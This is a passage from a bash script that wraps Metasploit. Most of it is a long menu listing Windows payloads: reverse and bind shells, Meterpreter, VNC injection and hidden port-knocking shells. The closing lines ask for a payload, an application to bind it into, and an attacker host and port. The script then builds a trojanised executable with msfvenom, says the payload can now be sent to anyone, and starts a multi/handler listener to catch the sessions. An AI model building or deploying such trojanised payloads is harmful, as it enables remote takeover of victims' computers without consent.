    windows/peinject/reverse_tcp_allport  Inject a custom native PE file into t
    s                                     he exploited process using a reflecti
                                          ve PE loader. The reflective PE loade
                                          r will execute the pre-mapped PE imag
                                          e starting from the address of entry
                                          after performing image base relocatio
                                          n and API address resolution. This mo
                                          dule requires a PE file that contains
                                           relocation data and a valid (uncorru
                                          pted) import table. PE files with CLR
                                          (C#/.NET executables), bounded import
                                          s, and TLS callbacks are not currentl
                                          y supported. Also PE files which use
                                          resource loading might crash. . Try t
                                          o connect back to the attacker, on al
                                          l possible ports (1-65535, slowly)
    windows/peinject/reverse_tcp_dns      Inject a custom native PE file into t
                                          he exploited process using a reflecti
                                          ve PE loader. The reflective PE loade
                                          r will execute the pre-mapped PE imag
                                          e starting from the address of entry
                                          after performing image base relocatio
                                          n and API address resolution. This mo
                                          dule requires a PE file that contains
                                           relocation data and a valid (uncorru
                                          pted) import table. PE files with CLR
                                          (C#/.NET executables), bounded import
                                          s, and TLS callbacks are not currentl
                                          y supported. Also PE files which use
                                          resource loading might crash. . Conne
                                          ct back to the attacker
    windows/peinject/reverse_tcp_rc4      Inject a custom native PE file into t
                                          he exploited process using a reflecti
                                          ve PE loader. The reflective PE loade
                                          r will execute the pre-mapped PE imag
                                          e starting from the address of entry
                                          after performing image base relocatio
                                          n and API address resolution. This mo
                                          dule requires a PE file that contains
                                           relocation data and a valid (uncorru
                                          pted) import table. PE files with CLR
                                          (C#/.NET executables), bounded import
                                          s, and TLS callbacks are not currentl
                                          y supported. Also PE files which use
                                          resource loading might crash. . Conne
                                          ct back to the attacker
    windows/peinject/reverse_tcp_rc4_dns  Inject a custom native PE file into t
                                          he exploited process using a reflecti
                                          ve PE loader. The reflective PE loade
                                          r will execute the pre-mapped PE imag
                                          e starting from the address of entry
                                          after performing image base relocatio
                                          n and API address resolution. This mo
                                          dule requires a PE file that contains
                                           relocation data and a valid (uncorru
                                          pted) import table. PE files with CLR
                                          (C#/.NET executables), bounded import
                                          s, and TLS callbacks are not currentl
                                          y supported. Also PE files which use
                                          resource loading might crash. . Conne
                                          ct back to the attacker
    windows/peinject/reverse_tcp_uuid     Inject a custom native PE file into t
                                          he exploited process using a reflecti
                                          ve PE loader. The reflective PE loade
                                          r will execute the pre-mapped PE imag
                                          e starting from the address of entry
                                          after performing image base relocatio
                                          n and API address resolution. This mo
                                          dule requires a PE file that contains
                                           relocation data and a valid (uncorru
                                          pted) import table. PE files with CLR
                                          (C#/.NET executables), bounded import
                                          s, and TLS callbacks are not currentl
                                          y supported. Also PE files which use
                                          resource loading might crash. . Conne
                                          ct back to the attacker with UUID Sup
                                          port
    windows/pingback_bind_tcp             Open a socket and report UUID when a
                                          connection is received (Windows x86)
    windows/pingback_reverse_tcp          Connect back to attacker and report U
                                          UID (Windows x86)
    windows/powershell_bind_tcp           Listen for a connection and spawn an
                                          interactive powershell session
    windows/powershell_reverse_tcp        Listen for a connection and spawn an
                                          interactive powershell session
    windows/powershell_reverse_tcp_ssl    Listen for a connection and spawn an
                                          interactive powershell session over S
                                          SL
    windows/shell/bind_hidden_ipknock_tc  Spawn a piped command shell (staged).
    p                                      Listen for a connection. First, the
                                          port will need to be knocked from the
                                           IP defined in KHOST. This IP will wo
                                          rk as an authentication method (you c
                                          an spoof it with tools like hping). A
                                          fter that you could get your shellcod
                                          e from any IP. The socket will appear
                                           as 'closed,' thus helping to hide th
                                          e shellcode
    windows/shell/bind_hidden_tcp         Spawn a piped command shell (staged).
                                           Listen for a connection from a hidde
                                          n port and spawn a command shell to t
                                          he allowed host.
    windows/shell/bind_ipv6_tcp           Spawn a piped command shell (staged).
                                           Listen for an IPv6 connection (Windo
                                          ws x86)
    windows/shell/bind_ipv6_tcp_uuid      Spawn a piped command shell (staged).
                                           Listen for an IPv6 connection with U
                                          UID Support (Windows x86)
    windows/shell/bind_named_pipe         Spawn a piped command shell (staged).
                                           Listen for a pipe connection (Window
                                          s x86)
    windows/shell/bind_nonx_tcp           Spawn a piped command shell (staged).
                                           Listen for a connection (No NX)
    windows/shell/bind_tcp                Spawn a piped command shell (staged).
                                           Listen for a connection (Windows x86
                                          )
    windows/shell/bind_tcp_rc4            Spawn a piped command shell (staged).
                                           Listen for a connection
    windows/shell/bind_tcp_uuid           Spawn a piped command shell (staged).
                                           Listen for a connection with UUID Su
                                          pport (Windows x86)
    windows/shell/find_tag                Spawn a piped command shell (staged).
                                           Use an established connection
    windows/shell/reverse_ipv6_tcp        Spawn a piped command shell (staged).
                                           Connect back to the attacker over IP
                                          v6
    windows/shell/reverse_nonx_tcp        Spawn a piped command shell (staged).
                                           Connect back to the attacker (No NX)
    windows/shell/reverse_ord_tcp         Spawn a piped command shell (staged).
                                           Connect back to the attacker
    windows/shell/reverse_tcp             Spawn a piped command shell (staged).
                                           Connect back to the attacker
    windows/shell/reverse_tcp_allports    Spawn a piped command shell (staged).
                                           Try to connect back to the attacker,
                                           on all possible ports (1-65535, slow
                                          ly)
    windows/shell/reverse_tcp_dns         Spawn a piped command shell (staged).
                                           Connect back to the attacker
    windows/shell/reverse_tcp_rc4         Spawn a piped command shell (staged).
                                           Connect back to the attacker
    windows/shell/reverse_tcp_rc4_dns     Spawn a piped command shell (staged).
                                           Connect back to the attacker
    windows/shell/reverse_tcp_uuid        Spawn a piped command shell (staged).
                                           Connect back to the attacker with UU
                                          ID Support
    windows/shell/reverse_udp             Spawn a piped command shell (staged).
                                           Connect back to the attacker with UU
                                          ID Support
    windows/shell_bind_tcp                Listen for a connection and spawn a c
                                          ommand shell
    windows/shell_bind_tcp_xpfw           Disable the Windows ICF, then listen
                                          for a connection and spawn a command
                                          shell
    windows/shell_hidden_bind_tcp         Listen for a connection from certain
                                          IP and spawn a command shell. The she
                                          llcode will reply with a RST packet i
                                          f the connections is not coming from
                                          the IP defined in AHOST. This way the
                                           port will appear as 'closed' helping
                                           us to hide the shellcode.
    windows/shell_reverse_tcp             Connect back to attacker and spawn a
                                          command shell
    windows/speak_pwned                   Causes the target to say 'You Got Pwn
                                          ed' via the Windows Speech API
    windows/upexec/bind_hidden_ipknock_t  Uploads an executable and runs it (st
    cp                                    aged). Listen for a connection. First
                                          , the port will need to be knocked fr
                                          om the IP defined in KHOST. This IP w
                                          ill work as an authentication method
                                          (you can spoof it with tools like hpi
                                          ng). After that you could get your sh
                                          ellcode from any IP. The socket will
                                          appear as 'closed,' thus helping to h
                                          ide the shellcode
    windows/upexec/bind_hidden_tcp        Uploads an executable and runs it (st
                                          aged). Listen for a connection from a
                                           hidden port and spawn a command shel
                                          l to the allowed host.
    windows/upexec/bind_ipv6_tcp          Uploads an executable and runs it (st
                                          aged). Listen for an IPv6 connection
                                          (Windows x86)
    windows/upexec/bind_ipv6_tcp_uuid     Uploads an executable and runs it (st
                                          aged). Listen for an IPv6 connection
                                          with UUID Support (Windows x86)
    windows/upexec/bind_named_pipe        Uploads an executable and runs it (st
                                          aged). Listen for a pipe connection (
                                          Windows x86)
    windows/upexec/bind_nonx_tcp          Uploads an executable and runs it (st
                                          aged). Listen for a connection (No NX
                                          )
    windows/upexec/bind_tcp               Uploads an executable and runs it (st
                                          aged). Listen for a connection (Windo
                                          ws x86)
    windows/upexec/bind_tcp_rc4           Uploads an executable and runs it (st
                                          aged). Listen for a connection
    windows/upexec/bind_tcp_uuid          Uploads an executable and runs it (st
                                          aged). Listen for a connection with U
                                          UID Support (Windows x86)
    windows/upexec/find_tag               Uploads an executable and runs it (st
                                          aged). Use an established connection
    windows/upexec/reverse_ipv6_tcp       Uploads an executable and runs it (st
                                          aged). Connect back to the attacker o
                                          ver IPv6
    windows/upexec/reverse_nonx_tcp       Uploads an executable and runs it (st
                                          aged). Connect back to the attacker (
                                          No NX)
    windows/upexec/reverse_ord_tcp        Uploads an executable and runs it (st
                                          aged). Connect back to the attacker
    windows/upexec/reverse_tcp            Uploads an executable and runs it (st
                                          aged). Connect back to the attacker
    windows/upexec/reverse_tcp_allports   Uploads an executable and runs it (st
                                          aged). Try to connect back to the att
                                          acker, on all possible ports (1-65535
                                          , slowly)
    windows/upexec/reverse_tcp_dns        Uploads an executable and runs it (st
                                          aged). Connect back to the attacker
    windows/upexec/reverse_tcp_rc4        Uploads an executable and runs it (st
                                          aged). Connect back to the attacker
    windows/upexec/reverse_tcp_rc4_dns    Uploads an executable and runs it (st
                                          aged). Connect back to the attacker
    windows/upexec/reverse_tcp_uuid       Uploads an executable and runs it (st
                                          aged). Connect back to the attacker w
                                          ith UUID Support
    windows/upexec/reverse_udp            Uploads an executable and runs it (st
                                          aged). Connect back to the attacker w
                                          ith UUID Support
    windows/vncinject/bind_hidden_ipknoc  Inject a VNC Dll via a reflective loa
    k_tcp                                 der (staged). Listen for a connection
                                          . First, the port will need to be kno
                                          cked from the IP defined in KHOST. Th
                                          is IP will work as an authentication
                                          method (you can spoof it with tools l
                                          ike hping). After that you could get
                                          your shellcode from any IP. The socke
                                          t will appear as 'closed,' thus helpi
                                          ng to hide the shellcode
    windows/vncinject/bind_hidden_tcp     Inject a VNC Dll via a reflective loa
                                          der (staged). Listen for a connection
                                           from a hidden port and spawn a comma
                                          nd shell to the allowed host.
    windows/vncinject/bind_ipv6_tcp       Inject a VNC Dll via a reflective loa
                                          der (staged). Listen for an IPv6 conn
                                          ection (Windows x86)
    windows/vncinject/bind_ipv6_tcp_uuid  Inject a VNC Dll via a reflective loa
                                          der (staged). Listen for an IPv6 conn
                                          ection with UUID Support (Windows x86
                                          )
    windows/vncinject/bind_named_pipe     Inject a VNC Dll via a reflective loa
                                          der (staged). Listen for a pipe conne
                                          ction (Windows x86)
    windows/vncinject/bind_nonx_tcp       Inject a VNC Dll via a reflective loa
                                          der (staged). Listen for a connection
                                           (No NX)
    windows/vncinject/bind_tcp            Inject a VNC Dll via a reflective loa
                                          der (staged). Listen for a connection
                                           (Windows x86)
    windows/vncinject/bind_tcp_rc4        Inject a VNC Dll via a reflective loa
                                          der (staged). Listen for a connection
    windows/vncinject/bind_tcp_uuid       Inject a VNC Dll via a reflective loa
                                          der (staged). Listen for a connection
                                           with UUID Support (Windows x86)
    windows/vncinject/find_tag            Inject a VNC Dll via a reflective loa
                                          der (staged). Use an established conn
                                          ection
    windows/vncinject/reverse_hop_http    Inject a VNC Dll via a reflective loa
                                          der (staged). Tunnel communication ov
                                          er an HTTP or HTTPS hop point. Note t
                                          hat you must first upload data/hop/ho
                                          p.php to the PHP server you wish to u
                                          se as a hop.
    windows/vncinject/reverse_http        Inject a VNC Dll via a reflective loa
                                          der (staged). Tunnel communication ov
                                          er HTTP (Windows wininet)
    windows/vncinject/reverse_http_proxy  Inject a VNC Dll via a reflective loa
    _pstore                               der (staged). Tunnel communication ov
                                          er HTTP
    windows/vncinject/reverse_ipv6_tcp    Inject a VNC Dll via a reflective loa
                                          der (staged). Connect back to the att
                                          acker over IPv6
    windows/vncinject/reverse_nonx_tcp    Inject a VNC Dll via a reflective loa
                                          der (staged). Connect back to the att
                                          acker (No NX)
    windows/vncinject/reverse_ord_tcp     Inject a VNC Dll via a reflective loa
                                          der (staged). Connect back to the att
                                          acker
    windows/vncinject/reverse_tcp         Inject a VNC Dll via a reflective loa
                                          der (staged). Connect back to the att
                                          acker
    windows/vncinject/reverse_tcp_allpor  Inject a VNC Dll via a reflective loa
    ts                                    der (staged). Try to connect back to
                                          the attacker, on all possible ports (
                                          1-65535, slowly)
    windows/vncinject/reverse_tcp_dns     Inject a VNC Dll via a reflective loa
                                          der (staged). Connect back to the att
                                          acker
    windows/vncinject/reverse_tcp_rc4     Inject a VNC Dll via a reflective loa
                                          der (staged). Connect back to the att
                                          acker
    windows/vncinject/reverse_tcp_rc4_dn  Inject a VNC Dll via a reflective loa
    s                                     der (staged). Connect back to the att
                                          acker
    windows/vncinject/reverse_tcp_uuid    Inject a VNC Dll via a reflective loa
                                          der (staged). Connect back to the att
                                          acker with UUID Support
    windows/vncinject/reverse_winhttp     Inject a VNC Dll via a reflective loa
                                          der (staged). Tunnel communication ov
                                          er HTTP (Windows winhttp)
    windows/x64/exec                      Execute an arbitrary command (Windows
                                           x64)
    windows/x64/loadlibrary               Load an arbitrary x64 library path
    windows/x64/messagebox                Spawn a dialog via MessageBox using a
                                           customizable title, text & icon
    windows/x64/meterpreter/bind_ipv6_tc  Inject the meterpreter server DLL via
    p                                      the Reflective Dll Injection payload
                                           (staged). Requires Windows XP SP2 or
                                           newer. Listen for an IPv6 connection
                                           (Windows x64)
    windows/x64/meterpreter/bind_ipv6_tc  Inject the meterpreter server DLL via
    p_uuid                                 the Reflective Dll Injection payload
                                           (staged). Requires Windows XP SP2 or
                                           newer. Listen for an IPv6 connection
                                           with UUID Support (Windows x64)
    windows/x64/meterpreter/bind_named_p  Inject the meterpreter server DLL via
    ipe                                    the Reflective Dll Injection payload
                                           (staged). Requires Windows XP SP2 or
                                           newer. Listen for a pipe connection
                                          (Windows x64)
    windows/x64/meterpreter/bind_tcp      Inject the meterpreter server DLL via
                                           the Reflective Dll Injection payload
                                           (staged). Requires Windows XP SP2 or
                                           newer. Listen for a connection (Wind
                                          ows x64)
    windows/x64/meterpreter/bind_tcp_rc4  Inject the meterpreter server DLL via
                                           the Reflective Dll Injection payload
                                           (staged). Requires Windows XP SP2 or
                                           newer. Connect back to the attacker
    windows/x64/meterpreter/bind_tcp_uui  Inject the meterpreter server DLL via
    d                                      the Reflective Dll Injection payload
                                           (staged). Requires Windows XP SP2 or
                                           newer. Listen for a connection with
                                          UUID Support (Windows x64)
    windows/x64/meterpreter/reverse_http  Inject the meterpreter server DLL via
                                           the Reflective Dll Injection payload
                                           (staged). Requires Windows XP SP2 or
                                           newer. Tunnel communication over HTT
                                          P (Windows x64 wininet)
    windows/x64/meterpreter/reverse_http  Inject the meterpreter server DLL via
    s                                      the Reflective Dll Injection payload
                                           (staged). Requires Windows XP SP2 or
                                           newer. Tunnel communication over HTT
                                          P (Windows x64 wininet)
    windows/x64/meterpreter/reverse_name  Inject the meterpreter server DLL via
    d_pipe                                 the Reflective Dll Injection payload
                                           (staged). Requires Windows XP SP2 or
                                           newer. Connect back to the attacker
                                          via a named pipe pivot
    windows/x64/meterpreter/reverse_tcp   Inject the meterpreter server DLL via
                                           the Reflective Dll Injection payload
                                           (staged). Requires Windows XP SP2 or
                                           newer. Connect back to the attacker
                                          (Windows x64)
    windows/x64/meterpreter/reverse_tcp_  Inject the meterpreter server DLL via
    rc4                                    the Reflective Dll Injection payload
                                           (staged). Requires Windows XP SP2 or
                                           newer. Connect back to the attacker
    windows/x64/meterpreter/reverse_tcp_  Inject the meterpreter server DLL via
    uuid                                   the Reflective Dll Injection payload
                                           (staged). Requires Windows XP SP2 or
                                           newer. Connect back to the attacker
                                          with UUID Support (Windows x64)
    windows/x64/meterpreter/reverse_winh  Inject the meterpreter server DLL via
    ttp                                    the Reflective Dll Injection payload
                                           (staged). Requires Windows XP SP2 or
                                           newer. Tunnel communication over HTT
                                          P (Windows x64 winhttp)
    windows/x64/meterpreter/reverse_winh  Inject the meterpreter server DLL via
    ttps                                   the Reflective Dll Injection payload
                                           (staged). Requires Windows XP SP2 or
                                           newer. Tunnel communication over HTT
                                          PS (Windows x64 winhttp)
    windows/x64/meterpreter_bind_named_p  Connect to victim and spawn a Meterpr
    ipe                                   eter shell. Requires Windows XP SP2 o
                                          r newer.
    windows/x64/meterpreter_bind_tcp      Connect to victim and spawn a Meterpr
                                          eter shell. Requires Windows XP SP2 o
                                          r newer.
    windows/x64/meterpreter_reverse_http  Connect back to attacker and spawn a
                                          Meterpreter shell. Requires Windows X
                                          P SP2 or newer.
    windows/x64/meterpreter_reverse_http  Connect back to attacker and spawn a
    s                                     Meterpreter shell. Requires Windows X
                                          P SP2 or newer.
    windows/x64/meterpreter_reverse_ipv6  Connect back to attacker and spawn a
    _tcp                                  Meterpreter shell. Requires Windows X
                                          P SP2 or newer.
    windows/x64/meterpreter_reverse_tcp   Connect back to attacker and spawn a
                                          Meterpreter shell. Requires Windows X
                                          P SP2 or newer.
    windows/x64/peinject/bind_ipv6_tcp    Inject a custom native PE file into t
                                          he exploited process using a reflecti
                                          ve PE loader. The reflective PE loade
                                          r will execute the pre-mapped PE imag
                                          e starting from the address of entry
                                          after performing image base relocatio
                                          n and API address resolution. This mo
                                          dule requires a PE file that contains
                                           relocation data and a valid (uncorru
                                          pted) import table. PE files with CLR
                                          (C#/.NET executables), bounded import
                                          s, and TLS callbacks are not currentl
                                          y supported. Also PE files which use
                                          resource loading might crash. . Liste
                                          n for an IPv6 connection (Windows x64
                                          )
    windows/x64/peinject/bind_ipv6_tcp_u  Inject a custom native PE file into t
    uid                                   he exploited process using a reflecti
                                          ve PE loader. The reflective PE loade
                                          r will execute the pre-mapped PE imag
                                          e starting from the address of entry
                                          after performing image base relocatio
                                          n and API address resolution. This mo
                                          dule requires a PE file that contains
                                           relocation data and a valid (uncorru
                                          pted) import table. PE files with CLR
                                          (C#/.NET executables), bounded import
                                          s, and TLS callbacks are not currentl
                                          y supported. Also PE files which use
                                          resource loading might crash. . Liste
                                          n for an IPv6 connection with UUID Su
                                          pport (Windows x64)
    windows/x64/peinject/bind_named_pipe  Inject a custom native PE file into t
                                          he exploited process using a reflecti
                                          ve PE loader. The reflective PE loade
                                          r will execute the pre-mapped PE imag
                                          e starting from the address of entry
                                          after performing image base relocatio
                                          n and API address resolution. This mo
                                          dule requires a PE file that contains
                                           relocation data and a valid (uncorru
                                          pted) import table. PE files with CLR
                                          (C#/.NET executables), bounded import
                                          s, and TLS callbacks are not currentl
                                          y supported. Also PE files which use
                                          resource loading might crash. . Liste
                                          n for a pipe connection (Windows x64)
    windows/x64/peinject/bind_tcp         Inject a custom native PE file into t
                                          he exploited process using a reflecti
                                          ve PE loader. The reflective PE loade
                                          r will execute the pre-mapped PE imag
                                          e starting from the address of entry
                                          after performing image base relocatio
                                          n and API address resolution. This mo
                                          dule requires a PE file that contains
                                           relocation data and a valid (uncorru
                                          pted) import table. PE files with CLR
                                          (C#/.NET executables), bounded import
                                          s, and TLS callbacks are not currentl
                                          y supported. Also PE files which use
                                          resource loading might crash. . Liste
                                          n for a connection (Windows x64)
    windows/x64/peinject/bind_tcp_rc4     Inject a custom native PE file into t
                                          he exploited process using a reflecti
                                          ve PE loader. The reflective PE loade
                                          r will execute the pre-mapped PE imag
                                          e starting from the address of entry
                                          after performing image base relocatio
                                          n and API address resolution. This mo
                                          dule requires a PE file that contains
                                           relocation data and a valid (uncorru
                                          pted) import table. PE files with CLR
                                          (C#/.NET executables), bounded import
                                          s, and TLS callbacks are not currentl
                                          y supported. Also PE files which use
                                          resource loading might crash. . Conne
                                          ct back to the attacker
    windows/x64/peinject/bind_tcp_uuid    Inject a custom native PE file into t
                                          he exploited process using a reflecti
                                          ve PE loader. The reflective PE loade
                                          r will execute the pre-mapped PE imag
                                          e starting from the address of entry
                                          after performing image base relocatio
                                          n and API address resolution. This mo
                                          dule requires a PE file that contains
                                           relocation data and a valid (uncorru
                                          pted) import table. PE files with CLR
                                          (C#/.NET executables), bounded import
                                          s, and TLS callbacks are not currentl
                                          y supported. Also PE files which use
                                          resource loading might crash. . Liste
                                          n for a connection with UUID Support
                                          (Windows x64)
    windows/x64/peinject/reverse_named_p  Inject a custom native PE file into t
    ipe                                   he exploited process using a reflecti
                                          ve PE loader. The reflective PE loade
                                          r will execute the pre-mapped PE imag
                                          e starting from the address of entry
                                          after performing image base relocatio
                                          n and API address resolution. This mo
                                          dule requires a PE file that contains
                                           relocation data and a valid (uncorru
                                          pted) import table. PE files with CLR
                                          (C#/.NET executables), bounded import
                                          s, and TLS callbacks are not currentl
                                          y supported. Also PE files which use
                                          resource loading might crash. . Conne
                                          ct back to the attacker via a named p
                                          ipe pivot
    windows/x64/peinject/reverse_tcp      Inject a custom native PE file into t
                                          he exploited process using a reflecti
                                          ve PE loader. The reflective PE loade
                                          r will execute the pre-mapped PE imag
                                          e starting from the address of entry
                                          after performing image base relocatio
                                          n and API address resolution. This mo
                                          dule requires a PE file that contains
                                           relocation data and a valid (uncorru
                                          pted) import table. PE files with CLR
                                          (C#/.NET executables), bounded import
                                          s, and TLS callbacks are not currentl
                                          y supported. Also PE files which use
                                          resource loading might crash. . Conne
                                          ct back to the attacker (Windows x64)
    windows/x64/peinject/reverse_tcp_rc4  Inject a custom native PE file into t
                                          he exploited process using a reflecti
                                          ve PE loader. The reflective PE loade
                                          r will execute the pre-mapped PE imag
                                          e starting from the address of entry
                                          after performing image base relocatio
                                          n and API address resolution. This mo
                                          dule requires a PE file that contains
                                           relocation data and a valid (uncorru
                                          pted) import table. PE files with CLR
                                          (C#/.NET executables), bounded import
                                          s, and TLS callbacks are not currentl
                                          y supported. Also PE files which use
                                          resource loading might crash. . Conne
                                          ct back to the attacker
    windows/x64/peinject/reverse_tcp_uui  Inject a custom native PE file into t
    d                                     he exploited process using a reflecti
                                          ve PE loader. The reflective PE loade
                                          r will execute the pre-mapped PE imag
                                          e starting from the address of entry
                                          after performing image base relocatio
                                          n and API address resolution. This mo
                                          dule requires a PE file that contains
                                           relocation data and a valid (uncorru
                                          pted) import table. PE files with CLR
                                          (C#/.NET executables), bounded import
                                          s, and TLS callbacks are not currentl
                                          y supported. Also PE files which use
                                          resource loading might crash. . Conne
                                          ct back to the attacker with UUID Sup
                                          port (Windows x64)
    windows/x64/pingback_reverse_tcp      Connect back to attacker and report U
                                          UID (Windows x64)
    windows/x64/powershell_bind_tcp       Listen for a connection and spawn an
                                          interactive powershell session
    windows/x64/powershell_reverse_tcp    Listen for a connection and spawn an
                                          interactive powershell session
    windows/x64/powershell_reverse_tcp_s  Listen for a connection and spawn an
    sl                                    interactive powershell session over S
                                          SL
    windows/x64/shell/bind_ipv6_tcp       Spawn a piped command shell (Windows
                                          x64) (staged). Listen for an IPv6 con
                                          nection (Windows x64)
    windows/x64/shell/bind_ipv6_tcp_uuid  Spawn a piped command shell (Windows
                                          x64) (staged). Listen for an IPv6 con
                                          nection with UUID Support (Windows x6
                                          4)
    windows/x64/shell/bind_named_pipe     Spawn a piped command shell (Windows
                                          x64) (staged). Listen for a pipe conn
                                          ection (Windows x64)
    windows/x64/shell/bind_tcp            Spawn a piped command shell (Windows
                                          x64) (staged). Listen for a connectio
                                          n (Windows x64)
    windows/x64/shell/bind_tcp_rc4        Spawn a piped command shell (Windows
                                          x64) (staged). Connect back to the at
                                          tacker
    windows/x64/shell/bind_tcp_uuid       Spawn a piped command shell (Windows
                                          x64) (staged). Listen for a connectio
                                          n with UUID Support (Windows x64)
    windows/x64/shell/reverse_tcp         Spawn a piped command shell (Windows
                                          x64) (staged). Connect back to the at
                                          tacker (Windows x64)
    windows/x64/shell/reverse_tcp_rc4     Spawn a piped command shell (Windows
                                          x64) (staged). Connect back to the at
                                          tacker
    windows/x64/shell/reverse_tcp_uuid    Spawn a piped command shell (Windows
                                          x64) (staged). Connect back to the at
                                          tacker with UUID Support (Windows x64
                                          )
    windows/x64/shell_bind_tcp            Listen for a connection and spawn a c
                                          ommand shell (Windows x64)
    windows/x64/shell_reverse_tcp         Connect back to attacker and spawn a
                                          command shell (Windows x64)
    windows/x64/vncinject/bind_ipv6_tcp   Inject a VNC Dll via a reflective loa
                                          der (Windows x64) (staged). Listen fo
                                          r an IPv6 connection (Windows x64)
    windows/x64/vncinject/bind_ipv6_tcp_  Inject a VNC Dll via a reflective loa
    uuid                                  der (Windows x64) (staged). Listen fo
                                          r an IPv6 connection with UUID Suppor
                                          t (Windows x64)
    windows/x64/vncinject/bind_named_pip  Inject a VNC Dll via a reflective loa
    e                                     der (Windows x64) (staged). Listen fo
                                          r a pipe connection (Windows x64)
    windows/x64/vncinject/bind_tcp        Inject a VNC Dll via a reflective loa
                                          der (Windows x64) (staged). Listen fo
                                          r a connection (Windows x64)
    windows/x64/vncinject/bind_tcp_rc4    Inject a VNC Dll via a reflective loa
                                          der (Windows x64) (staged). Connect b
                                          ack to the attacker
    windows/x64/vncinject/bind_tcp_uuid   Inject a VNC Dll via a reflective loa
                                          der (Windows x64) (staged). Listen fo
                                          r a connection with UUID Support (Win
                                          dows x64)
    windows/x64/vncinject/reverse_http    Inject a VNC Dll via a reflective loa
                                          der (Windows x64) (staged). Tunnel co
                                          mmunication over HTTP (Windows x64 wi
                                          ninet)
    windows/x64/vncinject/reverse_https   Inject a VNC Dll via a reflective loa
                                          der (Windows x64) (staged). Tunnel co
                                          mmunication over HTTP (Windows x64 wi
                                          ninet)
    windows/x64/vncinject/reverse_tcp     Inject a VNC Dll via a reflective loa
                                          der (Windows x64) (staged). Connect b
                                          ack to the attacker (Windows x64)
    windows/x64/vncinject/reverse_tcp_rc  Inject a VNC Dll via a reflective loa
    4                                     der (Windows x64) (staged). Connect b
                                          ack to the attacker
    windows/x64/vncinject/reverse_tcp_uu  Inject a VNC Dll via a reflective loa
    id                                    der (Windows x64) (staged). Connect b
                                          ack to the attacker with UUID Support
                                           (Windows x64)
    windows/x64/vncinject/reverse_winhtt  Inject a VNC Dll via a reflective loa
    p                                     der (Windows x64) (staged). Tunnel co
                                          mmunication over HTTP (Windows x64 wi
                                          nhttp)
    windows/x64/vncinject/reverse_winhtt  Inject a VNC Dll via a reflective loa
    ps                                    der (Windows x64) (staged). Tunnel co
                                          mmunication over HTTPS (Windows x64 w
                                          inhttp) 
";;
	0) echo -e "exiting" && exit;;
	*) echo -e "$red $bold Invalid option \n exiting $normal" && exit;; 
	
esac

echo -e "$bold $green ------------------------------------------------------------------------------- $normal"

echo -e "$blue $bold >>> Write payload name: (Enter payload name without spaces ' ')$normal"
read name

echo -e "$blue $bold >>> Do you want to bind Payload with another Software or Application: (Y/N)$normal"
read software

case $software in
	Y) echo -e "$blue $bold >>> Paste Application or Software location: (With file name) $normal" && read paste;;
	y) echo -e "$blue $bold >>> Paste Application or Software location: (With file name) $normal" && read paste;;
	N) echo -e "$green $bold >>> Let's continue $normal";;
	n) echo -e "$green $bold >>> Let's continue $normal";;
	*) echo -e "$red $bold >>> Invalid option \n exiting $normal" && exit;;
esac

clear

echo -e "$bold $green ------------------------------------------------------------------------------- $normal"


ifconfig

echo -e "$blue $bold >>> Provide LHOST: (IP) $normal" 
read ip
echo
echo -e "$blue $bold >>> Provide LPORT: (PORT) $normal"
read port
echo
echo -e "$blue $bold >>> Provide Output file name with location and extension: (ex. Application=.apk)$normal"
read output
clear

echo -e "$blue $bold >>> Do you want to add encoders in your Payload: (Y/N)$normal"
read endc

case $endc in
	Y) msfvenom -l encoders && echo -e "$blue $blod >>> Write encoder name: $normal" && read encoders;;
	y) msfvenom -l encoders && echo -e "$blue $bold >>> Write encoder name: $normal" && read encoders;;
	N) echo -e "$green $bold >>> Let's continue $normal";;
	n) echo -e "$green $bold >>> Let's continue $normal";;
	*) echo -e "$red $bold >>> Invalid option \n exiting $normal" && exit;;
esac

clear

echo -e "$bold $green ------------------------------------------------------------------------------- $normal"

msfvenom -x $paste -p $name  LHOST=$ip LPORT=$port -o $output 
sleep 5

echo
chmod +777 $output

echo -e "$bold $blue Now, you can send payload to anyone..."

echo -e "$bold $green ------------------------------------------------------------------------------- $normal"
sleep 5

clear

echo -e "$bold $red Wait loading #.... $normal"
sleep 1
clear
echo -e "$bold $red Wait loading ##... $normal"
sleep 1
clear
echo -e "$bold $red Wait loading ###.. $normal"
sleep 1
clear
echo -e "$bold $red Wait loading ####. $normal"
sleep 1
clear
echo -e "$bold $red Wait loading ##### $normal"
sleep 1
clear
echo -e "$bold $red Wait loading #.... $normal"
sleep 1
clear
echo -e "$bold $red Wait loading ##... $normal"
sleep 1
clear
echo -e "$bold $red Wait loading ###.. $normal"
sleep 1
clear
echo -e "$bold $red Wait loading ####. $normal"
sleep 1
clear
echo -e "$bold $red Wait loading ##### $normal"
sleep 2
clear


echo -e "\033[36m \033[40m"
echo " 
       ####       ####        ####       ###
       ####       ####        ####      ###
       ####       ####        ####     ###
       ####	  ####        ####    ###
       ###############        ####   ###
       ###############        #########
       ###############        #########
       ####       ####        ####   ###
       ####       ####        ####    ###
       ####       ####        ####     ###
       ####       ####        ####      ###"
echo -e "\033[0m"
sleep 6

clear

msfconsole -x "use exploit/multi/handler; set payload $name; set LHOST $ip; set LPORT $port; show options; echo 'Check all option are correct and correct options if not correct, You have 15 seconds to check and correct options:'; sleep 40; clear; exploit -j; echo 'when session was created interact with it using session -i <id>...';"


